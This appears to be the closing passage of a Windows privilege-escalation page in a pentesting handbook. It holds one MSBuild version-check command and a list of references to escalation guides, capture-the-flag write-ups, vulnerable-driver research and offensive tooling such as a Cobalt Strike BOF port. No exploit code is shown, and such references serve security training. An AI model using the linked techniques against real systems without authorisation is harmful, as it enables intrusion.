C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
